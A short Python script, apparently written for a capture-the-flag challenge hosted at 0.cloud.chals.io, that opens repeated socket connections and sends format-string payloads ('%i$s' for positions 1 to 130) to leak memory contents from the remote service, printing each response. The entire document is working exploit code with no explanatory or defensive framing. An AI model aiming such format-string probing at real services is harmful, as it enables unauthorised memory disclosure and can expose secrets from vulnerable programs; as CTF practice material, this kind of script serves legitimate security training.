import socket,time
H=('0.cloud.chals.io',23023)
def one(i):
 try:
  s=socket.create_connection(H,timeout=2);s.settimeout(.3);s.recv(10)
  s.sendall(f'SS%{i}$sEE\n'.encode()); o=b''
  while 1:
   try:d=s.recv(65536)
   except:break
   if not d:break
   o+=d
   if o.endswith(b'> '):break
  return o
 except Exception as e:return repr(e).encode()
for i in range(1,131):
 o=one(i)
 if len(o)>0 and o not in [b'']:
  print(i,repr(o[:500]))
